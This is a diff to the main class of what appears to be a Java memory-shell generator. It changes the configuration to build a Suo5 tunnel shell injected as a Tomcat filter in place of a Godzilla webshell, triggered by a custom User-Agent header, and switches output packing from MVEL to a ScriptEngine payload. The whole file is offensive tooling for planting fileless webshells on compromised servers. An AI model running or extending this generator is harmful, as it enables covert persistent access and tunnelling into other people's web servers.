@@ -1,7 +1,6 @@
 package com.reajason.javaweb;
 
 import com.reajason.javaweb.memshell.AbstractShell;
-import com.reajason.javaweb.memshell.SpringWebFluxShell;
 import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.packer.Packers;
 import com.reajason.javaweb.memshell.utils.CommonUtil;
@@ -21,7 +20,7 @@ public class GeneratorMain {
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
                 .server(Server.Tomcat)
-                .shellTool(ShellTool.Godzilla)
+                .shellTool(ShellTool.Suo5)
                 .shellType(Constants.FILTER)
                 .targetJreVersion(Opcodes.V1_8)
                 .debug(true)
@@ -38,14 +37,18 @@ public class GeneratorMain {
                 .headerName("User-Agent")
                 .headerValue("test").build();
 
+        Suo5Config suo5Config = Suo5Config.builder()
+                .headerName("User-Agent")
+                .headerValue("test").build();
+
         InjectorConfig injectorConfig = new InjectorConfig();
 
-        GenerateResult generateResult = generate(shellConfig, injectorConfig, godzillaConfig);
+        GenerateResult generateResult = generate(shellConfig, injectorConfig, suo5Config);
         if (generateResult != null) {
 //            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
 //            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
-            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
-            System.out.println(Packers.MVEL.getInstance().pack(generateResult));
+//            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
+            System.out.println(Packers.ScriptEngine.getInstance().pack(generateResult));
 //            Files.write(Path.of("target.jar"), Packer.INSTANCE.AgentJar.getPacker().packBytes(generateResult));
         }
     }
